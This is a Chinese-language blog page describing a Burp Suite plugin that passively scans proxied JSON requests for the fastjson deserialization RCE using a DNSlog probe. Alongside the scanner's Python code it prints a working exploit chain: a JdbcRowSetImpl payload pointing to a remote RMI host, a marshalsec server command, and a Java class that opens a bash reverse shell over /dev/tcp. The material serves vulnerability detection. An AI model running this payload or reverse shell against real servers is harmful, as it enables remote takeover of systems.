<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>fastjsonè¢«åŠ¨æ‰«æBurpæ’ä»¶ | ğŸ˜Š#</title>
  <meta name="author" content="JKme">
  
  <meta name="description" content="2019/08/13 Update.

ä»£ç æ²¡æœ‰è€ƒè™‘åˆ°jsoné‡Œé¢å¥—jsonçš„æƒ…å†µã€‚
ä»£ç æ²¡æœ‰è€ƒè™‘åˆ°åœ¨ä½¿ç”¨x-www-form-urlencodedçš„å‚æ•°æ˜¯jsonçš„æƒ…å†µã€‚è¿™ä¸¤ä¸ªåŠ ä¸Šå»ä¹‹åæ„Ÿè§‰æ¯ä¸ªè¯·æ±‚çš„æ—¶é—´éƒ½ä¼šå¢åŠ ï¼Œå…ˆæŒ–å‘ã€‚

2019/08/02 Update:

ä¹‹å‰çš„ä»£ç å¤ªçš„å¤ªçƒ‚ï¼Œå»æ‰äº†ä¸ç”¨çš„ä»£ç 
å¢åŠ äº†hashéªŒè¯ï¼Œå¦‚æœå·²ç»è¯·æ±‚è¿‡çš„URLç¬¬äºŒæ¬¡å°±ä¸æ£€æµ‹äº†ï¼Œéœ€å»ºç«‹/var/tmp/hash.txtæ–‡ä»¶ï¼ˆè‡ªå·±çœ‹ç€æ”¹å§)
å¦‚æœä¸ç†Ÿæ‚‰ï¼Œå°±çœ‹å®˜æ–¹æ–‡æ¡£ï¼Œæ–‡æ¡£ï¼Œæ–‡æ¡£ã€‚

main.py

#&amp;#x2F;usr&amp;#x2F;bin&amp;#x2F;env python
#! -*- coding:utf-8 -*-

from burp import IBurpExtender # å®šä¹‰æ’ä»¶çš„åŸºæœ¬ä¿¡æ¯ç±»
from burp import IHttpListener # httpæµé‡ç›‘å¬ç±»
from burp import IRequestInfo
from noauth import noauth_request
import hashlib

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks &amp;#x3D; callbacks
        self._helpers &amp;#x3D; callbacks.getHelpers() # é€šç”¨å‡½æ•°
        self._callbacks.setExtensionName(&amp;quot;fastjson_scan&amp;quot;)
        print &amp;quot;load fastjson_scan plugin success!&amp;quot;
        print &amp;quot;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;quot;
        # register ourselves as an HTTP listener
        callbacks.registerHttpListener(self)
    
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if toolFlag &amp;#x3D;&amp;#x3D; 4 or toolFlag &amp;#x3D;&amp;#x3D; 64 or toolFlag &amp;#x3D;&amp;#x3D; 16 or toolFlag &amp;#x3D;&amp;#x3D; 32:
            if  messageIsRequest:
                request &amp;#x3D; messageInfo.getRequest()
                analyzedRequest &amp;#x3D; self._helpers.analyzeRequest(request)
                contype &amp;#x3D; analyzedRequest.getContentType()  #get Content-type, è¿™é‡Œçœ‹å®˜æ–¹æ–‡æ¡£
                url &amp;#x3D; str(messageInfo.getUrl())
                with open(&amp;#39;&amp;#x2F;var&amp;#x2F;tmp&amp;#x2F;hash.txt&amp;#39;) as f:
                    lines &amp;#x3D; f.read().splitlines()
                m &amp;#x3D; hashlib.md5()
                m.update(url)
                print url
                if contype &amp;#x3D;&amp;#x3D; 4 and m.hexdigest() not in lines:    #æ˜¯çš„ï¼Œjsonçš„æ—¶å€™typeç­‰äº4
                    with open(&amp;#39;&amp;#x2F;var&amp;#x2F;tmp&amp;#x2F;hash.txt&amp;#39;,&amp;#39;a+&amp;#39;) as f:
                        f.write(m.hexdigest()+&amp;quot;\n&amp;quot;)
                    print &amp;quot;[Info]Check url is: %s&amp;quot; % url
                    cur &amp;#x3D; noauth_request(url)
                    noauth_result &amp;#x3D; cur.run()
                    if noauth_result: 
                        print &amp;quot;[Critical] Found it is a Fastjson RCE %s&amp;quot; % noauth_result[0]
                    print &amp;quot;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;quot;
                    print &amp;quot;&amp;quot;
                else:
                    pass


fastjsonåœ¨1.2.47ä»¥ä¸‹ï¼ŒåŒ…æ‹¬1.2.47å­˜åœ¨ååºåˆ—åŒ–å¯¼è‡´çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼Œpayload:
&amp;#123;&amp;quot;@type&amp;quot;:&amp;quot;java.lang.Class&amp;quot;,&amp;quot;val&amp;quot;:&amp;quot;com.sun.rowset.JdbcRowSetImpl&amp;quot;&amp;#125;,&amp;quot;f&amp;quot;:&amp;#123;&amp;quot;@type&amp;quot;:&amp;quot;com.sun.rowset.JdbcRowSetImpl&amp;quot;,&amp;quot;dataSourceName&amp;quot;:&amp;quot;rmi:&amp;#x2F;&amp;#x2F;ip:8000&amp;#x2F;Exploit&amp;quot;,&amp;quot;autoCommit&amp;quot;:true&amp;#125;&amp;#125;

ç„¶ååœ¨è¿œç¨‹ä¸»æœºå¼€å¯rmiæœåŠ¡å’ŒExploit.classwebæœåŠ¡å°±å¯ä»¥æ‰“äº†ã€‚
java -cp target&amp;#x2F;marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http:&amp;#x2F;&amp;#x2F;ip:8888&amp;#x2F;#Exploit 8000"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="fastjsonè¢«åŠ¨æ‰«æBurpæ’ä»¶"/>
  <meta property="og:site_name" content="ğŸ˜Š#"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/favicon.png" rel="icon">
  
  

  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
  <script src="/js/jquery-2.0.3.min.js"></script>
<!--   <script src="/js/highlight.min.js"></script>
  <script>hljs.highlightAll();</script>
  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="ğŸ˜Š#" type="application/atom+xml">
</head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">ğŸ˜Š#</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/project" title="All the categories.">
			  <i class=""></i>Projects
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class="fa fa-rss"></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> fastjsonè¢«åŠ¨æ‰«æBurpæ’ä»¶</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <p>2019/08/13 Update.</p>
<ol>
<li>ä»£ç æ²¡æœ‰è€ƒè™‘åˆ°jsoné‡Œé¢å¥—jsonçš„æƒ…å†µã€‚</li>
<li>ä»£ç æ²¡æœ‰è€ƒè™‘åˆ°åœ¨ä½¿ç”¨x-www-form-urlencodedçš„å‚æ•°æ˜¯jsonçš„æƒ…å†µã€‚<br>è¿™ä¸¤ä¸ªåŠ ä¸Šå»ä¹‹åæ„Ÿè§‰æ¯ä¸ªè¯·æ±‚çš„æ—¶é—´éƒ½ä¼šå¢åŠ ï¼Œå…ˆæŒ–å‘ã€‚</li>
</ol>
<p>2019/08/02 Update:</p>
<ol>
<li>ä¹‹å‰çš„ä»£ç å¤ªçš„å¤ªçƒ‚ï¼Œå»æ‰äº†ä¸ç”¨çš„ä»£ç </li>
<li>å¢åŠ äº†hashéªŒè¯ï¼Œå¦‚æœå·²ç»è¯·æ±‚è¿‡çš„URLç¬¬äºŒæ¬¡å°±ä¸æ£€æµ‹äº†ï¼Œéœ€å»ºç«‹<code>/var/tmp/hash.txt</code>æ–‡ä»¶ï¼ˆè‡ªå·±çœ‹ç€æ”¹å§)</li>
<li>å¦‚æœä¸ç†Ÿæ‚‰ï¼Œå°±çœ‹å®˜æ–¹æ–‡æ¡£ï¼Œæ–‡æ¡£ï¼Œæ–‡æ¡£ã€‚</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">main.py

#&#x2F;usr&#x2F;bin&#x2F;env python
#! -*- coding:utf-8 -*-

from burp import IBurpExtender # å®šä¹‰æ’ä»¶çš„åŸºæœ¬ä¿¡æ¯ç±»
from burp import IHttpListener # httpæµé‡ç›‘å¬ç±»
from burp import IRequestInfo
from noauth import noauth_request
import hashlib

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks &#x3D; callbacks
        self._helpers &#x3D; callbacks.getHelpers() # é€šç”¨å‡½æ•°
        self._callbacks.setExtensionName(&quot;fastjson_scan&quot;)
        print &quot;load fastjson_scan plugin success!&quot;
        print &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;
        # register ourselves as an HTTP listener
        callbacks.registerHttpListener(self)
    
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if toolFlag &#x3D;&#x3D; 4 or toolFlag &#x3D;&#x3D; 64 or toolFlag &#x3D;&#x3D; 16 or toolFlag &#x3D;&#x3D; 32:
            if  messageIsRequest:
                request &#x3D; messageInfo.getRequest()
                analyzedRequest &#x3D; self._helpers.analyzeRequest(request)
                contype &#x3D; analyzedRequest.getContentType()  #get Content-type, è¿™é‡Œçœ‹å®˜æ–¹æ–‡æ¡£
                url &#x3D; str(messageInfo.getUrl())
                with open(&#39;&#x2F;var&#x2F;tmp&#x2F;hash.txt&#39;) as f:
                    lines &#x3D; f.read().splitlines()
                m &#x3D; hashlib.md5()
                m.update(url)
                print url
                if contype &#x3D;&#x3D; 4 and m.hexdigest() not in lines:    #æ˜¯çš„ï¼Œjsonçš„æ—¶å€™typeç­‰äº4
                    with open(&#39;&#x2F;var&#x2F;tmp&#x2F;hash.txt&#39;,&#39;a+&#39;) as f:
                        f.write(m.hexdigest()+&quot;\n&quot;)
                    print &quot;[Info]Check url is: %s&quot; % url
                    cur &#x3D; noauth_request(url)
                    noauth_result &#x3D; cur.run()
                    if noauth_result: 
                        print &quot;[Critical] Found it is a Fastjson RCE %s&quot; % noauth_result[0]
                    print &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;
                    print &quot;&quot;
                else:
                    pass<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<p>fastjsonåœ¨<code>1.2.47</code>ä»¥ä¸‹ï¼ŒåŒ…æ‹¬1.2.47å­˜åœ¨ååºåˆ—åŒ–å¯¼è‡´çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼Œpayload:</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;f&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;ip:8000&#x2F;Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç„¶ååœ¨è¿œç¨‹ä¸»æœºå¼€å¯rmiæœåŠ¡å’Œ<code>Exploit.class</code>webæœåŠ¡å°±å¯ä»¥æ‰“äº†ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">java -cp target&#x2F;marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http:&#x2F;&#x2F;ip:8888&#x2F;#Exploit 8000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">Exploit.java
javac Exploit.java  &#x2F;&#x2F;ç¼–è¯‘ä¸ºclass
java Exploit  &#x2F;&#x2F;è¿è¡Œæµ‹è¯•
ç„¶åç”¨pythonçš„httpæ¨¡å—èµ·ä¸€ä¸ªwebæœåŠ¡å°±å¯ç”¨ã€‚

public class Exploit &#123;
    public Exploit()&#123;
        try &#123;
            &#x2F;&#x2F; Runtime.getRuntime().exec(&quot;calc&quot;);
            java.lang.Runtime.getRuntime().exec(
                    new String[]&#123;&quot;bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;4545 0&gt;&amp;1&quot;&#125;);
        &#125; catch(Exception e)&#123;
            e.printStackTrace();
        &#125;
    &#125;
    public static void main(String[] argv)&#123;
        Exploit e &#x3D; new Exploit();
    &#125;
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>é¦–å…ˆä½ è¦æœ‰ä¸€ä¸ªå¯ä»¥æ‰“çš„æ¥å£ï¼Œè¿™å°±å¾ˆè›‹ç–¼äº†ã€‚æƒ³äº†åŠå¤©æ‰¾äº†lufeiå†™çš„ä¸€ä¸ªxxescannerï¼Œæƒ³äº†ä¸‹å¯ä»¥ä¿®æ”¹ä¸ºè‡ªå·±çš„æ£€æµ‹å·¥å…·ï¼Œä½†æ˜¯åˆ°æœ€åæ²¡æˆåŠŸã€‚</p>
<p>javaä¸ç†Ÿæ‚‰åªèƒ½è½¬å‘è‡ªå·±ç†Ÿæ‚‰çš„pythonï¼Œæœ€åç»¼åˆäº†ä¸‹ç»ˆäºå†™å‡ºæ¥äº†ã€‚</p>
<p>###DNSlog</p>
<p>å› ä¸ºä½¿ç”¨æ–°çš„payloadæ‰“äº†å­˜åœ¨fastjsonæ¼æ´çš„åº”ç”¨ä¹‹åï¼Œè€çš„payloadå°±å¯ä»¥æ‰“äº† :)<br>ä»å°å¯†åœˆé‡Œé¢æ‰¾åˆ°äº†ä¸€ä»½POC</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;baidu.com&quot;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>å¯ä»¥åˆ©ç”¨dnslogï¼Œæ ¹æ®valæ›´æ¢ä¸ºè‡ªå·±çš„æœåŠ¡å™¨ï¼Œè¾£ä¹ˆä¹…å¯ä»¥äº†ã€‚è¿™ä¸ªpocåœ¨1.2.48ä¹‹åå°±ä¸èƒ½ç”¨äº†ï¼Œç®€ç›´æ˜¯ç»ä½³çš„POCã€‚<br>dnslogè¦ç”¨bit4æ”¹ä¹‹åçš„é‚£ä¸ªã€‚</p>
<p>æ€è·¯å°±æ˜¯è¯·æ±‚è‡ªå·±çš„è§£æï¼Œç„¶åæ ¹æ®æ¥å£å»æ£€æµ‹æ˜¯å¦æœ‰å¯¹åº”çš„è§£æ:</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;test.baidu.com&quot;&#125;&#125;
http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;apiquery&#x2F;dns&#x2F;test&#x2F;a2f78f403d7b8b92ca3486bb4dc0e498&#x2F;
&#x2F;&#x2F;æŸ¥è¯¢æ˜¯å¦æœ‰testçš„è§£æ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>å®é™…ä¸­å¯ä»¥ç”Ÿæˆä¸€ä¸²éšæœºå­—ç¬¦ä¸²ï¼Œç„¶åå»è¯·æ±‚æ˜¯å¦æœ‰å¯¹åº”çš„è§£æ:</p>
<pre class="line-numbers language-none"><code class="language-none">def genRandom(self):
    letters &#x3D; string.ascii_lowercase
    s &#x3D; &#39;&#39;.join(random.sample(letters, 10))
    payload &#x3D; hashlib.md5(s + str(time.time())).hexdigest()
    return payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸¤ä¸ªæ­¥éª¤:</p>
<ol>
<li>æ£€æµ‹åˆ°è¯·æ±‚ä¸­æ˜¯å¦æœ‰jsonæ ¼å¼çš„è¯·æ±‚ï¼Œè¿™é‡Œå¯ä»¥æ ¹æ®<code>Content-Type</code>ï¼ˆå¯èƒ½ä¸å‡†ç¡®)ï¼Œæ£€æµ‹ä¹‹åï¼Œæ„é€ bodyï¼Œæ‰“POC</li>
<li>ç„¶åå†å»æ£€æµ‹è‡ªå·±çš„dnslogæ˜¯å¦å­˜åœ¨ç›¸åº”çš„è®°å½•</li>
</ol>
<p>###ä¸è¶³<br>requestsæ˜¯åŒæ­¥è¯·æ±‚ï¼Œæ‰€ä»¥å¦‚æœä½ çš„dnslogæœåŠ¡å™¨æ”¾åœ¨å¤ªå¹³æ´‹é‚£è¾¹ï¼Œä½ çš„burpä¼šè®©ä½ æ€€ç–‘äººç”Ÿï¼ŒåŠ nginxåä»£ï¼ŒåŠ cdnã€‚</p>
<p>MDç»ˆäºå¼„å®Œäº†ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">main.py

#&#x2F;usr&#x2F;bin&#x2F;env python
#! -*- coding:utf-8 -*-
import re
from burp import IBurpExtender # å®šä¹‰æ’ä»¶çš„åŸºæœ¬ä¿¡æ¯ç±»
from burp import IHttpListener # httpæµé‡ç›‘å¬ç±»
from noauth import noauth_request

res_host &#x3D; re.compile(r&#39;Host: ([^,]*)&#39;)
res_path &#x3D; re.compile(r&#39;POST ([^ ]*) HTTP&#x2F;&#39;)
class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks &#x3D; callbacks
        self._helpers &#x3D; callbacks.getHelpers() # é€šç”¨å‡½æ•°
        self._callbacks.setExtensionName(&quot;fastjson_scan&quot;)
        print &quot;load fastjson_scan plugin success!&quot;
        print &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;
        # register ourselves as an HTTP listener
        callbacks.registerHttpListener(self)
    
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if toolFlag &#x3D;&#x3D; 4 or toolFlag &#x3D;&#x3D; 64 or toolFlag &#x3D;&#x3D; 16 or toolFlag &#x3D;&#x3D; 32:
            if not messageIsRequest:
                response &#x3D; messageInfo.getResponse() # get response
                analyzedResponse &#x3D; self._helpers.analyzeResponse(response)
                body &#x3D; response[analyzedResponse.getBodyOffset():] 
                body_string &#x3D; body.tostring() # get response_body
                request &#x3D; messageInfo.getRequest()
                analyzedRequest &#x3D; self._helpers.analyzeResponse(request)
                request_header &#x3D; analyzedRequest.getHeaders()
                # print request_header[0]
                # print request_header
                header_string &#x3D; &#39;&#39;.join(request_header)
                # print header_string
                # try:
                #     method,path &#x3D; res_path.findall(request_header[0])[0]
                #     host &#x3D; res_host.findall(request_header[1])[0]
                #     print flag_json
                #     url &#x3D; method+&quot; &quot;+host+path
                # except:
                #     url &#x3D; &quot;&quot;
                # if method&#x3D;&#x3D;&quot;POST&quot; and flag_json:
                if r&quot;application&#x2F;json&quot; in header_string:
                    # æ£€æµ‹GETè¯·æ±‚çš„æ¥å£

                    # print path
                    # print host
                    try:
                        path &#x3D; res_path.findall(request_header[0])[0]
                        host &#x3D; res_host.findall(request_header[1])[0]
                        target &#x3D; host + path
                    except:
                        target &#x3D; &#39;&#39;
                    print &quot;[Info]Check url is:&quot; + host + path
                    cur &#x3D; noauth_request(host,path)
                    noauth_result &#x3D; cur.run()
                    if noauth_result: 
                        print &quot;[Critical] Found it is a Fastjson RCE %s&quot; % noauth_result[0]
                    print &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;
                    print &quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">noauth.py

#!&#x2F;usr&#x2F;bin&#x2F;env python
#! -*- coding:utf-8 -*-
import requests
import random
import string
import hashlib
import time

headers&#x3D;&#123;
    
    &quot;User-Agent&quot;:&quot;Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;66.0.3359.139 Safari&#x2F;537.36&quot;,
    &quot;Accept-Language&quot;:&quot;zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,mt;q&#x3D;0.7,zh-TW;q&#x3D;0.6&quot;,
    &quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,
    &quot;Accept&quot;:&quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8&quot;
&#125;

headers2 &#x3D; &#123;

	&quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;66.0.3359.139 Safari&#x2F;537.36&quot;,
	&quot;Accept-Language&quot;: &quot;zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,mt;q&#x3D;0.7,zh-TW;q&#x3D;0.6&quot;,
	&quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,
	&quot;Accept&quot;: &quot;*&quot;,
	&quot;Content-Type&quot;: &quot;application&#x2F;json&quot;
&#125;
class noauth_request(object):
    # æœªæˆæƒè®¿é—®æ¼æ´æ£€æµ‹
    def __init__(self,host,path):
        self.url &#x3D; &quot;http:&#x2F;&#x2F;&quot;+host+path
        self.randomStr &#x3D; &#39;&#39;

    def run(self):
        return_list &#x3D; []
        self.randomStr &#x3D; self.genRandom()
        if self.verify():
            return_list.append(self.url)
        return return_list


    def verify(self):
        payload &#x3D; &#39;&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;&#39; + self.randomStr + &#39;&lt;domain&gt;&quot;&#125;&#125;&#39;
        # print payload
        try:
            res &#x3D; requests.post(url&#x3D;self.url, data&#x3D;payload, timeout&#x3D;20, headers&#x3D;headers2, verify&#x3D;False)
        except Exception, e:
            print str(e)

        poc_url &#x3D; &quot;http:&#x2F;&#x2F;&lt;domain&gt;&#x2F;apiquery&#x2F;dns&#x2F;&quot; + self.randomStr  + &quot;&#x2F;&lt;token&gt;&#x2F;&quot;
        # print poc_url
        try:
            req &#x3D; requests.get(poc_url, headers&#x3D;headers)
            if self.randomStr in req.content:
                return True
        except Exception,e:
            print str(e)
        return False

    def genRandom(self):
        letters &#x3D; string.ascii_lowercase
        s &#x3D; &#39;&#39;.join(random.sample(letters, 10))
        payload &#x3D; hashlib.md5(s + str(time.time())).hexdigest()
        return payload


